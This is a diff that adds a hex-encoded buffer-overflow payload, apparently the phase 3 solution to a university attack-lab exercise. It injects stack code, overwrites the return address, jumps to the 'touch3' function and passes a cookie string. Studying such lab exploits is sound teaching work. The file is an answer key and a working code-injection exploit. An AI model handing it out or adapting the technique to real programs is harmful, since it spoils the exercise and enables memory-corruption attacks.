@@ -1,0 +1,6 @@
+48 c7 c7 60 81 67 55 c3  /* From helpers/phase3.asm */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+38 81 67 55 00 00 00 00 /* rsp address */
+68 1a 40 00 00 00 00 00 /* touch3 */
+36 38 65 32 64 39 39 61 /* cookie https://www.online-toolz.com/tools/text-hex-convertor.php */
